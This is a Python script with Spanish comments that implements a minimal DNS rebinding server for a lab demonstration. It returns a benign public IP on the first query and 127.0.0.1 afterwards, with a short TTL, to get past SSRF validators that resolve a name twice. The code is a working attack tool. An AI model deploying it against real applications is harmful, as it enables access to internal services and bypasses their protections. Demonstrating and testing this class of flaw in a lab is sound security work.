"""
dns_rebinding_server.py
-----------------------
Servidor DNS minimalista para DEMOSTRAR el concepto de DNS rebinding en un
entorno de laboratorio controlado.

Comportamiento: a la PRIMERA consulta A para el dominio configurado responde
con una IP publica (benigna), y a partir de la SEGUNDA consulta responde con
127.0.0.1. Esto simula un atacante que controla el DNS de su propio dominio
y cambia la respuesta justo despues de que el validador de la app hizo su
chequeo (resolver #1) pero antes de que el cliente HTTP haga el fetch real
(resolver #2), si la app resuelve el DNS dos veces.

Requiere privilegios de administrador para escuchar en el puerto 53, y
configurar tu resolver (/etc/hosts no sirve para esto, hace falta apuntar
el DNS del sistema o de la app a 127.0.0.1 en este servidor, o usar un
dominio real delegado a este servidor). Pensado para correr en tu propia
maquina de laboratorio, nunca contra infraestructura de terceros.

Uso:
    sudo python dns_rebinding_server.py midominio.test

Luego apuntá la resolución de "midominio.test" a este servidor (por ejemplo
agregando un NS/registro de prueba en tu propio entorno de DNS local, o
usando una herramienta como dnsmasq apuntando a 127.0.0.1 como forwarder).
"""

import socket
import sys
import struct

DOMAIN = sys.argv[1] if len(sys.argv) > 1 else "midominio.test"
PUBLIC_IP = "93.184.216.34"   # IP publica benigna de ejemplo (primer round)
REBIND_IP = "127.0.0.1"       # IP objetivo real (segundo round en adelante)

query_count = {}

def build_response(query: bytes, ip: str) -> bytes:
    transaction_id = query[:2]
    flags = b"\x81\x80"
    qdcount = query[4:6]
    ancount = b"\x00\x01"
    nscount = b"\x00\x00"
    arcount = b"\x00\x00"
    header = transaction_id + flags + qdcount + ancount + nscount + arcount

    question = query[12:]
    answer = (
        b"\xc0\x0c"          # puntero al nombre en la pregunta
        b"\x00\x01"          # type A
        b"\x00\x01"          # class IN
        + struct.pack(">I", 5)   # TTL bajo (5s) para forzar re-resolucion
        + b"\x00\x04"
        + socket.inet_aton(ip)
    )
    return header + question + answer


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 53))
    print(f"Escuchando consultas DNS para '{DOMAIN}' en el puerto 53...")
    print(f"1ra consulta -> {PUBLIC_IP} | 2da en adelante -> {REBIND_IP}")

    while True:
        data, addr = sock.recvfrom(512)
        query_count[addr] = query_count.get(addr, 0) + 1
        ip = PUBLIC_IP if query_count[addr] == 1 else REBIND_IP
        print(f"Consulta #{query_count[addr]} de {addr} -> respondiendo {ip}")
        sock.sendto(build_response(data, ip), addr)


if __name__ == "__main__":
    main()
